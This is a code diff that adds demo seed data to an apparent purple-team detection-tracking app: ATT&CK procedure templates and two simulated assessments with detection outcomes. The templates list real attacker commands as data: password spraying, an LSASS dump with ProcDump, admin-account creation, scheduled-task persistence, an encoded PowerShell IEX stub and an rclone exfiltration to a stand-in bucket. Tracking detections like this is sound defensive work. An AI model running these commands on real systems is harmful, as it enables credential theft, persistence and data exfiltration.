@@ -28,6 +28,14 @@ from app.models import (
     Lifecycle,
     LifecycleEvent,
     OutputMetric,
+    PtAssessment,
+    PtAssessmentStatus,
+    PtBlueStatus,
+    PtCampaign,
+    PtDetection,
+    PtRedStatus,
+    PtTemplate,
+    PtTestCase,
     ReferenceItem,
     RefKind,
     Snapshot,
@@ -320,6 +328,208 @@ def _demo_snapshots(db: Session, rules, today: date, default_interval: int) -> i
     return n
 
 
+DEMO_PT_SOURCE = "demo"
+DEMO_PROCEDURES = [
+    (
+        "Password spraying against Active Directory",
+        "T1110.003",
+        "credential-access",
+        "Invoke-DomainPasswordSpray -Password 'Winter2026!'",
+        ["SIEM", "Identity protection"],
+    ),
+    (
+        "Dump LSASS memory with ProcDump",
+        "T1003.001",
+        "credential-access",
+        "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\l.dmp",
+        ["EDR"],
+    ),
+    (
+        "Create a local administrator account",
+        "T1136.001",
+        "persistence",
+        "net user demo-adm P@ssw0rd! /add && net localgroup administrators demo-adm /add",
+        ["SIEM", "EDR"],
+    ),
+    (
+        "Scheduled task for persistence",
+        "T1053.005",
+        "persistence",
+        'schtasks /create /tn "Updater" /tr C:\\Temp\\u.exe /sc onlogon',
+        ["EDR", "SIEM"],
+    ),
+    (
+        "Encoded PowerShell command",
+        "T1059.001",
+        "execution",
+        "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
+        ["EDR"],
+    ),
+    ("Domain trust discovery", "T1482", "discovery", "nltest /domain_trusts", ["SIEM"]),
+    (
+        "Exfiltration to cloud storage over HTTPS",
+        "T1567.002",
+        "exfiltration",
+        "rclone copy C:\\Data demo-remote:bucket",
+        ["Proxy", "DLP"],
+    ),
+    (
+        "Sign-in with valid account from a new country",
+        "T1078",
+        "initial-access",
+        "VPN sign-in from a foreign exit node",
+        ["SIEM"],
+    ),
+]
+_PT_OUTCOMES = ["blocked", "alerted", "alerted", "logged_central", "logged_local", "none"]
+
+
+def _demo_purple(db: Session, rnd: random.Random, rules, today: date) -> int:
+    """Two purple team assessments (the second a re-run of the first) for the trends page."""
+    from app import purple as pt
+
+    old = list(db.scalars(select(PtTemplate).where(PtTemplate.source == DEMO_PT_SOURCE)))
+    for a in db.scalars(select(PtAssessment).where(PtAssessment.created_by == "demo")):
+        db.delete(a)
+    for t in old:
+        db.delete(t)
+    db.flush()
+    candidates = [
+        pt.RuleCandidate(r.id, r.code, r.name, r.lifecycle_status.value, r.attack_techniques or [])
+        for r in rules
+    ]
+    by_id = {r.id: r for r in rules}
+    templates = []
+    for name, tid, tactic, command, defenses in DEMO_PROCEDURES:
+        tpl = PtTemplate(
+            name=name,
+            name_key=name.lower(),
+            techniques=[tid],
+            tactic=tactic,
+            platforms=["windows"],
+            executor="manual",
+            command=command,
+            expected_defenses=defenses,
+            source=DEMO_PT_SOURCE,
+            tags=["demo"],
+        )
+        db.add(tpl)
+        templates.append(tpl)
+    db.flush()
+    plans = [
+        ("Purple team 2026 H1", today - timedelta(days=150), PtAssessmentStatus.completed),
+        (
+            "Purple team 2026 H2 (re-run)",
+            today - timedelta(days=12),
+            PtAssessmentStatus.in_progress,
+        ),
+    ]
+    previous, n = None, 0
+    last: dict[int, int] = {}
+    for idx, (name, start, state) in enumerate(plans):
+        a = PtAssessment(
+            name=name,
+            environment="Demo lab",
+            description="Generated demo data.",
+            scope="Windows domain, VPN and proxy of the demo company.",
+            summary=(
+                "Credential access is detected well. **Exfiltration to cloud storage is not "
+                "detected**: the proxy logs the traffic but no rule alerts on it."
+            )
+            if idx == 0
+            else "",
+            start_date=start,
+            end_date=start + timedelta(days=4) if state == PtAssessmentStatus.completed else None,
+            status=state,
+            previous_id=previous.id if previous else None,
+            created_by="demo",
+            updated_by="demo",
+        )
+        db.add(a)
+        camps = {
+            "Credential access and persistence": templates[:4],
+            "Execution, discovery and exfiltration": templates[4:],
+        }
+        for pos, (cname, tpls) in enumerate(camps.items()):
+            c = PtCampaign(assessment=a, name=cname, position=pos)
+            db.add(c)
+            for i, tpl in enumerate(tpls):
+                t = PtTestCase(
+                    campaign=c,
+                    template_id=tpl.id,
+                    lineage_key=f"tpl:{tpl.id}",
+                    name=tpl.name,
+                    techniques=list(tpl.techniques),
+                    tactic=tpl.tactic,
+                    platforms=["windows"],
+                    executor="manual",
+                    command=tpl.command,
+                    position=i,
+                    targets=[f"WS-{rnd.randint(100, 999)}"],
+                    sources=["red-kali-01"],
+                    red_tools=["manual"],
+                )
+                db.add(t)
+                n += 1
+                # the re-run leaves the last two tests of each campaign still to do
+                if idx == 1 and i >= len(tpls) - 2:
+                    continue
+                t.red_status = PtRedStatus.executed
+                t.attack_start = datetime.combine(
+                    start + timedelta(days=i % 4), time(9 + i, 15), tzinfo=UTC
+                )
+                t.attack_stop = t.attack_start + timedelta(minutes=rnd.randint(2, 25))
+                t.red_assignee = "demo-red"
+                t.blue_assignee = "demo-blue"
+                t.blue_status = PtBlueStatus.done
+                if tpl.techniques == ["T1567.002"]:
+                    outcome = "logged_central"
+                elif idx == 1 and tpl.id in last:
+                    # mostly better on the re-run, one regression
+                    prev = last[tpl.id]
+                    outcome = _PT_OUTCOMES[max(0, prev - 1) if i != 1 else min(5, prev + 2)]
+                else:
+                    k = rnd.randint(0, 5)
+                    last[tpl.id] = k
+                    outcome = _PT_OUTCOMES[k]
+                hits = pt.suggest_rules(tpl.techniques, candidates)
+                rule = by_id.get(hits[0]["id"]) if hits else None
+                detected = t.attack_start + timedelta(minutes=rnd.randint(1, 40))
+                if rule is not None:
+                    t.detections.append(
+                        PtDetection(
+                            kind="rule",
+                            l3_id=rule.id,
+                            rule_code=rule.code,
+                            outcome=outcome if outcome != "blocked" else "alerted",
+                            expected=True,
+                            alert_name=rule.name if outcome in ("alerted", "blocked") else "",
+                            detected_at=detected if outcome in ("alerted", "blocked") else None,
+                            position=0,
+                        )
+                    )
+                for j, tool in enumerate(tpl.expected_defenses):
+                    t.detections.append(
+                        PtDetection(
+                            kind="tool",
+                            tool=tool,
+                            outcome=outcome,
+                            expected=True,
+                            detected_at=detected if outcome in ("alerted", "blocked") else None,
+                            position=j + 1,
+                        )
+                    )
+                if outcome in ("none", "logged_local", "logged_central"):
+                    t.blue_notes = (
+                        "Seen in the logs only, no alert. Finding: add or tune a detection rule."
+                        if outcome != "none"
+                        else "Not visible anywhere. Finding: the log source is missing."
+                    )
+        db.flush()
+        previous = a
+    return n
+
+
 def apply_demo_data(
     db: Session, seed: int = 42, today: date | None = None, default_interval: int = 180
 ) -> dict[str, int]:
@@ -466,6 +676,7 @@ def apply_demo_data(
     counts["config_commits"] = _demo_configs(db, rnd, rules, users, today)
     counts["lifecycle_events"] = _demo_lifecycle(db, rnd, l2s, rules, users, today)
     counts["output_metrics"] = _demo_output(db, rnd, rules, today)
+    counts["purple_test_cases"] = _demo_purple(db, rnd, rules, today)
     db.flush()
     counts["snapshots"] = _demo_snapshots(db, rules, today, default_interval)
 
